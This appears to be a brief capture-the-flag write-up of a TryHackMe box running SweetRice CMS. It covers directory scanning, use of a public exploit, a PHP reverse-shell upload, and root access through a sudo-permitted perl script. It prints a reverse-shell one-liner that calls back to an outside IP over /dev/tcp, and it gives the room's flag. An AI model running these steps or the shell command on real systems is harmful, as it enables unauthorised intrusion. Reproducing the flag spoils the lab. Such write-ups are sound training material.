gobuster
searchsploit
rshell.phtml
sudo -l  ----> (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

did the basic port scanning. there was http and ssh.  did the web dir search and found content and also did dir search in there.

exploit db had some interesting exploit around this CMS(content management system)

[searchsploit sweetrice]

id did this using python one.found the account credentials using also a vulnerability. it had sql backups.

[searchsploit -m path_to_exploit]

uploaded python reverse shell as phtml. gain the access. 

root priviledge was also easy. had perl script in itguy user. it had sudo permission. edited bash script in /etc then ran the perl script using sudo.

[echo "bash -c 'bash -i >& /dev/tcp/10.8.0.247/4421 0>&1'" > copy.sh]

[sudo perlthing]



THM{6637f41d0177b6f37cb20d775124699f}
